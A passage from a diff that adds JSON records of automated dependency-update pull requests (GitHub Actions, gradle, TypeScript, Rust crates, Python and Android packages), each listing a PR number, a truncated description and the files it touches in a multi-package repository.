+        "plugins/plugin-bluebubbles/typescript/package.json",
+        "plugins/plugin-calendly/package.json",
+        "plugins/plugin-github/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update gradle to v9",
+      "prNumber": 6908,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [gradle](https://gradle.org) ([source](https://redirect.github.com/gradle/gradle)) | major | `8.9` → `9.4.1` |\n\n---\n\n> [!WARNING]\n> Some dependencies cou",
+      "files": [
+        "packages/app-core/platforms/android/gradle/wrapper/gradle-wrapper.properties"
+      ]
+    },
+    {
+      "title": "chore(deps): update github/codeql-action action to v4",
+      "prNumber": 6907,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [github/codeql-action](https://redirect.github.com/github/codeql-action) | action | major | `v3` → `v4` |\n\n---\n\n> [!WARNING]\n> Some dependenci",
+      "files": [
+        ".github/workflows/codeql.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update github artifact actions (major)",
+      "prNumber": 6906,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [actions/download-artifact](https://redirect.github.com/actions/download-artifact) | action | major | `v4` → `v8` |\n| [actions/upload-artifact",
+      "files": [
+        ".github/workflows/build-android.yml",
+        ".github/workflows/build-electron.yml",
+        ".github/workflows/build-ios.yml",
+        ".github/workflows/release-computeruse-npm.yaml",
+        ".github/workflows/release-rust.yaml",
+        ".github/workflows/supply-chain.yaml",
+        "packages/benchmarks/HyperliquidBench/.github/workflows/ci.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update docker/setup-buildx-action action to v4",
+      "prNumber": 6905,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [docker/setup-buildx-action](https://redirect.github.com/docker/setup-buildx-action) | action | major | `v3` → `v4` |\n\n---\n\n> [!WARNING]\n> Som",
+      "files": [
+        ".github/workflows/image.yaml"
+      ]
+    },
+    {
+      "title": "chore(deps): update docker/metadata-action action to v6",
+      "prNumber": 6904,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [docker/metadata-action](https://redirect.github.com/docker/metadata-action) | action | major | `v5` → `v6` |\n\n---\n\n> [!WARNING]\n> Some depend",
+      "files": [
+        ".github/workflows/image.yaml"
+      ]
+    },
+    {
+      "title": "chore(deps): update docker/login-action action to v4",
+      "prNumber": 6903,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [docker/login-action](https://redirect.github.com/docker/login-action) | action | major | `v3` → `v4` |\n\n---\n\n> [!WARNING]\n> Some dependencies",
+      "files": [
+        ".github/workflows/image.yaml",
+        ".github/workflows/tee-build-deploy.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update docker/build-push-action action to v7",
+      "prNumber": 6902,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [docker/build-push-action](https://redirect.github.com/docker/build-push-action) | action | major | `v5` → `v7` |\n| [docker/build-push-action]",
+      "files": [
+        ".github/workflows/image.yaml",
+        ".github/workflows/tee-build-deploy.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency vitest to v4",
+      "prNumber": 6901,
+      "type": "tests",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/configbench/package.json",
+        "packages/scenario-runner/package.json",
+        "plugins/plugin-calendly/package.json",
+        "plugins/plugin-computeruse/package.json",
+        "plugins/plugin-github/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency typescript to v6",
+      "prNumber": 6900,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [typescript](https://www.typescriptlang",
+      "files": [
+        "apps/app-companion/package.json",
+        "package.json",
+        "packages/agent/package.json",
+        "packages/app-core/package.json",
+        "packages/app-core/platforms/electrobun/package.json",
+        "packages/benchmarks/configbench/package.json",
+        "packages/benchmarks/evm/skill_runner/package.json",
+        "packages/benchmarks/gauntlet/sdk/typescript/package.json",
+        "packages/benchmarks/solana/solana-gym-env/docs/trajectory-viewer/package.json",
+        "packages/elizaos/package.json",
+        "packages/elizaos/templates/fullstack-app/apps/app/electrobun/package.json",
+        "packages/elizaos/templates/fullstack-app/apps/app/package.json",
+        "packages/elizaos/templates/plugin/rust/package.json",
+        "packages/elizaos/templates/plugin/typescript/package.json",
+        "packages/interop/package.json",
+        "packages/native-plugins/agent/package.json",
+        "packages/native-plugins/appblocker/package.json",
+        "packages/native-plugins/camera/package.json",
+        "packages/native-plugins/canvas/package.json",
+        "packages/native-plugins/desktop/package.json",
+        "packages/native-plugins/gateway/package.json",
+        "packages/native-plugins/llama/package.json",
+        "packages/native-plugins/location/package.json",
+        "packages/native-plugins/macosalarm/package.json",
+        "packages/native-plugins/mobile-signals/package.json",
+        "packages/native-plugins/screencapture/package.json",
+        "packages/native-plugins/swabble/package.json",
+        "packages/native-plugins/talkmode/package.json",
+        "packages/native-plugins/websiteblocker/package.json",
+        "packages/scenario-runner/package.json",
+        "packages/shared/package.json",
+        "packages/templates/fullstack-app/apps/app/electrobun/package.json",
+        "packages/templates/fullstack-app/apps/app/package.json",
+        "packages/templates/plugin/rust/package.json",
+        "packages/templates/plugin/typescript/package.json",
+        "packages/typescript/package.json",
+        "packages/ui/package.json",
+        "plugins/plugin-bluebubbles/typescript/package.json",
+        "plugins/plugin-calendly/package.json",
+        "plugins/plugin-computeruse/package.json",
+        "plugins/plugin-executecode/typescript/package.json",
+        "plugins/plugin-github/package.json",
+        "plugins/plugin-signal/typescript/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency rimraf to v6",
+      "prNumber": 6899,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [rimraf](https://redirect.github.com/is",
+      "files": [
+        "packages/native-plugins/agent/package.json",
+        "packages/native-plugins/appblocker/package.json",
+        "packages/native-plugins/camera/package.json",
+        "packages/native-plugins/canvas/package.json",
+        "packages/native-plugins/desktop/package.json",
+        "packages/native-plugins/gateway/package.json",
+        "packages/native-plugins/llama/package.json",
+        "packages/native-plugins/location/package.json",
+        "packages/native-plugins/mobile-signals/package.json",
+        "packages/native-plugins/screencapture/package.json",
+        "packages/native-plugins/swabble/package.json",
+        "packages/native-plugins/talkmode/package.json",
+        "packages/native-plugins/websiteblocker/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency python-dotenv to v1",
+      "prNumber": 6898,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [python-dotenv](https://redirect.github",
+      "files": [
+        "packages/benchmarks/OSWorld/monitor/requirements.txt"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency pandas to v3",
+      "prNumber": 6897,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [pandas](https://redirect.github.com/pa",
+      "files": [
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency p5.js to v2",
+      "prNumber": 6896,
+      "type": "other",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [p5.js](http://p5js.org) ([source](https://redirect.github.com/processing/p5.js)) ",
+      "files": [
+        "packages/benchmarks/openclaw-benchmark/mistralvibecli/.isolated_home/.vibe/skills/anthropic-algorithmic-art/templates/viewer.html"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency numpy to v2",
+      "prNumber": 6895,
+      "type": "other",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/OSWorld/requirements.txt"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency font-awesome to v7",
+      "prNumber": 6894,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [font-awesome](https://fontawesome.com/) ([source](https://redirect.github.com/FortAwesome/Font-Awesome)) | major | `5.15.4` → `7.0.1` |\n\n---\n\n> [!WARNIN",
+      "files": [
+        "packages/benchmarks/OSWorld/monitor/templates/index.html",
+        "packages/benchmarks/OSWorld/monitor/templates/task_detail.html"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency eslint to v10",
+      "prNumber": 6893,
+      "type": "other",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/native-plugins/gateway/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency color-name to v2",
+      "prNumber": 6892,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [color-name](https://redirect.github.co",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency color-convert to v3",
+      "prNumber": 6891,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [color-convert](https://redirect.github",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @vitejs/plugin-react to v6",
+      "prNumber": 6890,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@vitejs/plugin-react](https://redirect",
+      "files": [
+        "package.json",
+        "packages/benchmarks/solana/solana-gym-env/docs/trajectory-viewer/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @uniswap/v4-sdk to v2",
+      "prNumber": 6889,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@uniswap/v4-sdk](https://redirect.gith",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @uniswap/sdk-core to v7",
+      "prNumber": 6888,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@uniswap/sdk-core](https://redirect.gi",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @types/jsdom to v28",
+      "prNumber": 6887,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@types/jsdom](https://redirect.github.",
+      "files": [
+        "packages/agent/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @ionic/swiftlint-config to v2",
+      "prNumber": 6886,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@ionic/swiftlint-config](https://redir",
+      "files": [
+        "packages/native-plugins/gateway/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update android-actions/setup-android action to v4",
+      "prNumber": 6885,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [android-actions/setup-android](https://redirect.github.com/android-actions/setup-android) | action | major | `v3` → `v4` |\n\n---\n\n> [!WARNING]",
+      "files": [
+        ".github/workflows/build-android.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update anchore/scan-action action to v7",
+      "prNumber": 6884,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [anchore/scan-action](https://redirect.github.com/anchore/scan-action) | action | major | `v4` → `v7` |\n\n---\n\n> [!WARNING]\n> Some dependencies",
+      "files": [
+        ".github/workflows/supply-chain.yaml"
+      ]
+    },
+    {
+      "title": "chore(deps): update actions/setup-python action to v6",
+      "prNumber": 6883,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [actions/setup-python](https://redirect.github.com/actions/setup-python) | action | major | `v5` → `v6` |\n\n---\n\n> [!WARNING]\n> Some dependenci",
+      "files": [
+        ".github/workflows/ci.yaml",
+        ".github/workflows/jsdoc-automation.yml",
+        ".github/workflows/multi-lang-tests.yaml",
+        ".github/workflows/release-python.yaml"
+      ]
+    },
+    {
+      "title": "chore(deps): update actions/setup-node action to v6",
+      "prNumber": 6882,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [actions/setup-node](https://redirect.github.com/actions/setup-node) | action | major | `v4` → `v6` |\n\n---\n\n> [!WARNING]\n> Some dependencies c",
+      "files": [
+        ".github/workflows/build-android.yml",
+        ".github/workflows/build-electron.yml",
+        ".github/workflows/build-ios.yml",
+        ".github/workflows/ci.yaml",
+        ".github/workflows/jsdoc-automation.yml",
+        ".github/workflows/publish-next-prerelease.yaml",
+        ".github/workflows/release-computeruse-npm.yaml",
+        ".github/workflows/release.yaml",
+        ".github/workflows/sync-next-dist-tags.yaml"
+      ]
+    },
+    {
+      "title": "chore(deps): update actions/setup-java action to v5",
+      "prNumber": 6881,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [actions/setup-java](https://redirect.github.com/actions/setup-java) | action | major | `v4` → `v5` |\n\n---\n\n> [!WARNING]\n> Some dependencies c",
+      "files": [
+        ".github/workflows/build-android.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update actions/checkout action to v6",
+      "prNumber": 6880,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [actions/checkout](https://redirect.github.com/actions/checkout) | action | major | `v4` → `v6` |\n\n---\n\n> [!WARNING]\n> Some dependencies could",
+      "files": [
+        ".github/workflows/build-android.yml",
+        ".github/workflows/build-electron.yml",
+        ".github/workflows/build-ios.yml",
+        ".github/workflows/ci.yaml",
+        ".github/workflows/claude-code-review.yml",
+        ".github/workflows/claude-security-review.yml",
+        ".github/workflows/claude.yml",
+        ".github/workflows/codeql.yml",
+        ".github/workflows/docs-ci.yml",
+        ".github/workflows/image.yaml",
+        ".github/workflows/jsdoc-automation.yml",
+        ".github/workflows/multi-lang-tests.yaml",
+        ".github/workflows/pr.yaml",
+        ".github/workflows/publish-next-prerelease.yaml",
+        ".github/workflows/release-computeruse-crates.yaml",
+        ".github/workflows/release-computeruse-npm.yaml",
+        ".github/workflows/release-python.yaml",
+        ".github/workflows/release-rust.yaml",
+        ".github/workflows/release.yaml",
+        ".github/workflows/skill-review.yml",
+        ".github/workflows/supply-chain.yaml",
+        ".github/workflows/sync-next-dist-tags.yaml",
+        ".github/workflows/tee-build-deploy.yml",
+        ".github/workflows/weekly-maintenance.yml",
+        "packages/benchmarks/HyperliquidBench/.github/workflows/ci.yml",
+        "packages/benchmarks/solana/solana-gym-env/.github/workflows/deploy-trajectory-viewer.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update actions/cache action to v5",
+      "prNumber": 6879,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [actions/cache](https://redirect.github.com/actions/cache) | action | major | `v4` → `v5` |\n\n---\n\n> [!WARNING]\n> Some dependencies could not b",
+      "files": [
+        ".github/workflows/build-android.yml",
+        ".github/workflows/build-ios.yml",
+        ".github/workflows/multi-lang-tests.yaml",
+        ".github/workflows/release-computeruse-crates.yaml",
+        ".github/workflows/release-computeruse-npm.yaml",
+        ".github/workflows/release-rust.yaml",
+        ".github/workflows/release.yaml"
+      ]
+    },
+    {
+      "title": "chore(deps): update actions/attest-build-provenance action to v4",
+      "prNumber": 6878,
+      "type": "tests",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [actions/attest-build-provenance](https://redirect.github.com/actions/attest-build-provenance) | action | major | `v1` → `v4` |\n\n---\n\n> [!WARN",
+      "files": [
+        ".github/workflows/image.yaml"
+      ]
+    },
+    {
+      "title": "fix(deps): update tokio-prost monorepo to 0.14",
+      "prNumber": 6877,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [prost](https://redirect.github.com/tokio-rs/prost) | dependencies | minor | `0.13` → `0.14` |\n| [prost-build](https://redirect.github.com/tok",
+      "files": [
+        "packages/rust/Cargo.lock",
+        "packages/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate sysinfo to 0.38",
+      "prNumber": 6876,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [sysinfo](https://redirect.github.com/GuillaumeGomez/sysinfo) | dependencies | minor | `0.33` → `0.38` |\n\n---\n\n> [!WARNING]\n> Some dependencie",
+      "files": [
+        "packages/benchmarks/framework/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate sha2 to 0.11",
+      "prNumber": 6875,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [sha2](https://redirect.github.com/RustCrypto/hashes) | dependencies | minor | `0.10` → `0.11` |\n| [sha2](https://redirect.github.com/RustCryp",
+      "files": [
+        "packages/benchmarks/HyperliquidBench/Cargo.toml",
+        "packages/rust/Cargo.lock",
+        "packages/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate sha1 to 0.11",
+      "prNumber": 6874,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [sha1](https://redirect.github.com/RustCrypto/hashes) | dependencies | minor | `0.10` → `0.11` |\n\n---\n\n> [!WARNING]\n> Some dependencies could ",
+      "files": [
+        "packages/rust/Cargo.lock",
+        "packages/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate infer to 0.19",
+      "prNumber": 6873,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [infer](https://redirect.github.com/bojand/infer) | dependencies | minor | `0.16` → `0.19` |\n\n---\n\n> [!WARNING]\n> Some dependencies could not ",
+      "files": [
+        "packages/rust/Cargo.lock",
+        "packages/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate getrandom to 0.4",
+      "prNumber": 6872,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [getrandom](https://redirect.github.com/rust-random/getrandom) | dependencies | minor | `0.2` → `0.4` |\n\n---\n\n> [!WARNING]\n> Some dependencies",
+      "files": [
+        "packages/elizaos/templates/plugin/rust/Cargo.toml",
+        "packages/rust/Cargo.toml",
+        "packages/templates/plugin/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate criterion to 0.8",
+      "prNumber": 6871,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [criterion](https://criterion-rs.github.io/book/index.html) ([source](https://redirect.github.com/criterion-rs/criterion.rs)) | dependencies |",
+      "files": [
+        "packages/benchmarks/framework/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate cipher to 0.5",
+      "prNumber": 6870,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [cipher](https://redirect.github.com/RustCrypto/traits) | dependencies | minor | `0.4` → `0.5` |\n\n---\n\n> [!WARNING]\n> Some dependencies could ",
+      "files": [
+        "packages/rust/Cargo.lock",
+        "packages/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate cbc to 0.2",
+      "prNumber": 6869,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [cbc](https://redirect.github.com/RustCrypto/block-modes) | dependencies | minor | `0.1` → `0.2` |\n\n---\n\n> [!WARNING]\n> Some dependencies coul",
+      "files": [
+        "packages/rust/Cargo.lock",
+        "packages/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate aes to 0.9",
+      "prNumber": 6868,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [aes](https://redirect.github.com/RustCrypto/block-ciphers) | dependencies | minor | `0.8` → `0.9` |\n\n---\n\n> [!WARNING]\n> Some dependencies co",
+      "files": [
+        "packages/rust/Cargo.lock",
+        "packages/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update kotlinx-coroutines monorepo to v1.10.2",
+      "prNumber": 6867,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [org.jetbrains.kotlinx:kotlinx-coroutin",
+      "files": [
+        "packages/native-plugins/gateway/android/build.gradle",
+        "packages/native-plugins/talkmode/android/build.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency transformers to ~=5.5.4",
+      "prNumber": 6866,
+      "type": "bugfix",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py",
+        "packages/benchmarks/OSWorld/uv.lock"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency tqdm to ~=4.67.3",
+      "prNumber": 6865,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [tqdm](https://redirect.github.com/tqdm",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py",
+        "packages/benchmarks/OSWorld/uv.lock"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency torch to ~=2.11.0",
+      "prNumber": 6864,
+      "type": "bugfix",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py",
+        "packages/benchmarks/OSWorld/uv.lock"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency three to ^0.184.0",
+      "prNumber": 6863,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [three](https://threejs.org/) ([source]",
+      "files": [
+        "apps/app-companion/package.json",
+        "packages/app-core/package.json",
+        "packages/elizaos/templates/fullstack-app/apps/app/package.json",
+        "packages/templates/fullstack-app/apps/app/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency telegram to v2.26.22",
+      "prNumber": 6862,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [telegram](https://redirect.github.com/",
+      "files": [
+        "packages/agent/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency opencv-python to ~=4.13.0.92",
+      "prNumber": 6861,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [opencv-python](https://redirect.github",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency matplotlib to ~=3.10.8",
+      "prNumber": 6860,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [matplotlib](https://redirect.github.co",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py",
+        "packages/benchmarks/OSWorld/uv.lock"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency lucide-react to ^0.577.0",
+      "prNumber": 6859,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [lucide-react](https://lucide.dev) ([so",
+      "files": [
+        "apps/app-companion/package.json",
+        "apps/app-lifeops/package.json",
+        "apps/app-shopify/package.json",
+        "apps/app-steward/package.json",
+        "apps/app-task-coordinator/package.json",
+        "apps/app-vincent/package.json",
+        "packages/app-core/package.json",
+        "packages/ui/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency gymnasium to ~=0.29.1",
+      "prNumber": 6858,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [gymnasium](https://redirect.github.com",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py",
+        "packages/benchmarks/OSWorld/uv.lock"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency com.google.android.gms:play-services-location to v21.3.0",
+      "prNumber": 6857,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| com.google.android.gms:play-services-lo",
+      "files": [
+        "packages/native-plugins/location/android/build.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency androidx.test.ext:junit to v1.3.0",
+      "prNumber": 6856,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [androidx.test.ext:junit](https://devel",
+      "files": [
+        "packages/app-core/platforms/android/variables.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency androidx.test.espresso:espresso-core to v3.7.0",
+      "prNumber": 6855,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [androidx.test.espresso:espresso-core](",
+      "files": [
+        "packages/app-core/platforms/android/variables.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency androidx.exifinterface:exifinterface to v1.4.2",
+      "prNumber": 6854,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [androidx.exifinterface:exifinterface](",
+      "files": [
+        "packages/native-plugins/camera/android/build.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency androidx.core:core-splashscreen to v1.2.0",
+      "prNumber": 6853,
+      "type": "bugfix",
